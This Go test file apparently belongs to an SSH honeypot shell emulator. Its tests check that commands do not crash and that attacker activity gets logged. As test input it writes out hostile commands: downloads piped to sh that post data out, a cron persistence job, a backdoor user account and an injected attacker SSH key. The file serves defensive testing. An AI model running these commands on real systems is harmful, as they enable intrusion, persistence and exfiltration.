package commands_test

import (
	"strings"
	"testing"

	"github.com/antonmedv/ssham/internal/commands"
	"github.com/antonmedv/ssham/internal/shelltest"
)

// Output of each command is checked by the transcripts in testdata/.
// Run `go test ./internal/commands -update` after changing a command, then
// review the diff.
func TestTranscripts(t *testing.T) {
	shelltest.RunTranscripts(t, "testdata/*.txt")
}

// TestEveryCommandSurvivesJunk runs every registered command with odd
// arguments. Any panic is a bug: the shell would show "Segmentation fault".
// New commands are covered automatically.
func TestEveryCommandSurvivesJunk(t *testing.T) {
	argSets := []string{"", "--help", "-", "-x -y -z", "/nope", "/etc/passwd /etc", "'' ''", "-n", "-c", "-1 0 99999999999999999999"}
	for _, name := range commands.Registry().Names() {
		t.Run(name, func(t *testing.T) {
			for _, args := range argSets {
				for _, user := range []string{"root", "admin"} {
					s := shelltest.New(t, user)
					line := name + " " + args + " < /dev/null"
					if out, status := s.Exec(line); status == 139 {
						t.Errorf("%s: %s crashed:\n%s", user, line, out)
					}
				}
			}
		})
	}
}

// TestEveryCommandIsInstalled checks that registering a command puts it on
// $PATH, so `which`, completion and `ls /usr/bin` agree with what runs.
func TestEveryCommandIsInstalled(t *testing.T) {
	s := shelltest.New(t, "root")
	for _, name := range commands.Registry().Names() {
		if out, status := s.Exec("command -v " + name); status != 0 || !strings.HasPrefix(out, "/usr/") {
			t.Errorf("%s: command -v = %q (%d)", name, out, status)
		}
	}
}

func TestDownloadsAreLogged(t *testing.T) {
	s := shelltest.New(t, "root")
	s.Run("wget -q http://198.51.100.7/a.sh; curl -s -d secret=1 http://198.51.100.7/b | sh")
	ev := s.Events("download")
	if len(ev) != 2 {
		t.Fatalf("download events: %v", ev)
	}
	if ev[0]["tool"] != "wget" || ev[0]["url"] != "http://198.51.100.7/a.sh" || ev[0]["dest"] != "a.sh" {
		t.Errorf("wget event: %v", ev[0])
	}
	if ev[1]["tool"] != "curl" || ev[1]["url"] != "http://198.51.100.7/b" || ev[1]["post_data"] != "secret=1" {
		t.Errorf("curl event: %v", ev[1])
	}
}

func TestPasswordsAreLogged(t *testing.T) {
	s := shelltest.New(t, "admin")
	s.Run("sudo id", "sudo-pw")
	s.Run("su", "su-pw")
	s.Run("echo 'root:chpasswd-pw' | sudo chpasswd")
	var got []string
	for _, ev := range s.Events("password_entered") {
		got = append(got, ev["context"].(string)+"="+ev["password"].(string))
	}
	for _, ev := range s.Events("password_change") {
		got = append(got, ev["method"].(string)+"="+ev["password"].(string))
	}
	want := "sudo=sudo-pw su=su-pw chpasswd=chpasswd-pw"
	if strings.Join(got, " ") != want {
		t.Errorf("got %v, want %s", got, want)
	}
}

func TestPersistenceIsLogged(t *testing.T) {
	s := shelltest.New(t, "root")
	s.Run("echo '* * * * * curl x|sh' | crontab -")
	s.Run("useradd -m -p pwhash backdoor")
	s.Run("echo 'ssh-rsa AAAA attacker' >> ~/.ssh/authorized_keys")
	if ev := s.Events("crontab_install"); len(ev) != 1 || ev[0]["content"] != "* * * * * curl x|sh\n" {
		t.Errorf("crontab events: %v", ev)
	}
	if ev := s.Events("user_add"); len(ev) != 1 || ev[0]["user"] != "backdoor" || ev[0]["password_hash"] != "pwhash" {
		t.Errorf("user_add events: %v", ev)
	}
	if out, _ := s.Run("tail -1 ~/.ssh/authorized_keys"); out != "ssh-rsa AAAA attacker\n" {
		t.Errorf("authorized_keys: %q", out)
	}
}
